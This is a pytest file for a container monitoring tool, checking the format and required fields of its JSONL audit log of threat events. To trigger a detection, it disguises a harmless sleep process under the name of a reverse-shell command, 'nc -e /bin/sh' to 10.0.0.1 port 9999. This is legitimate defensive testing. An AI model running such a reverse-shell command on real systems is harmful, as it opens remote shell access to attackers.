"""Test audit log format and structure validation."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    get_container_name_from_workspace,
    get_threat_events,
    wait_for_container_running,
)


def test_audit_log_jsonl_format(test_workspace, enable_monitoring, coi_binary):
    """Verify audit log is valid JSONL with all required fields."""
    proc = subprocess.Popen(
        [
            coi_binary,
            "shell",
            "--workspace",
            test_workspace,
            "--slot",
            "21",
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-21"

    if not wait_for_container_running(container_name, timeout=30):
        proc.terminate()
        pytest.skip(f"Container {container_name} not found or not running")

    # Wait for monitoring baseline to stabilize
    time.sleep(10)

    # Trigger a threat to generate audit log entry
    subprocess.Popen(
        [
            "incus",
            "exec",
            container_name,
            "--",
            "bash",
            "-c",
            "exec -a 'nc -e /bin/sh 10.0.0.1 9999' sleep 30",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Wait for detection
    time.sleep(10)

    # Read audit log file directly
    log_path = Path.home() / ".coi" / "audit" / f"{container_name}.jsonl"
    assert log_path.exists(), "Audit log file should exist"

    # Parse and validate JSONL format
    # Get ThreatEvent objects (not MonitorSnapshots)
    events = get_threat_events(container_name)
    assert len(events) > 0, "Audit log should contain at least one ThreatEvent"

    for i, event in enumerate(events):
        # Verify required fields for ThreatEvent
        required_fields = [
            "id",
            "timestamp",
            "level",
            "category",
            "title",
            "description",
            "action",
        ]
        for field in required_fields:
            assert field in event, f"Missing required field '{field}' in event {i + 1}"

        # Verify field types
        assert isinstance(event["id"], str), "id should be string"
        assert isinstance(event["timestamp"], str), "timestamp should be string"
        assert isinstance(event["level"], str), "level should be string"
        assert isinstance(event["category"], str), "category should be string"
        assert isinstance(event["title"], str), "title should be string"
        assert isinstance(event["description"], str), "description should be string"
        assert isinstance(event["action"], str), "action should be string"

        # Verify level is valid
        assert event["level"] in ["info", "warning", "high", "critical"], (
            f"Invalid threat level: {event['level']}"
        )

        # Verify action is valid. "deduplicated" is emitted when the monitor
        # collapses repeated detections of the same threat (load-dependent, so
        # it only appears intermittently) — it's a valid action, see the
        # allowlist in test_threat_deduplication.
        assert event["action"] in [
            "logged",
            "alerted",
            "paused",
            "killed",
            "pending",
            "deduplicated",
        ], f"Invalid action: {event['action']}"

        # Verify evidence field exists and has content
        assert "evidence" in event, "Missing evidence field"

    proc.terminate()
    cleanup_container(container_name, coi_binary)
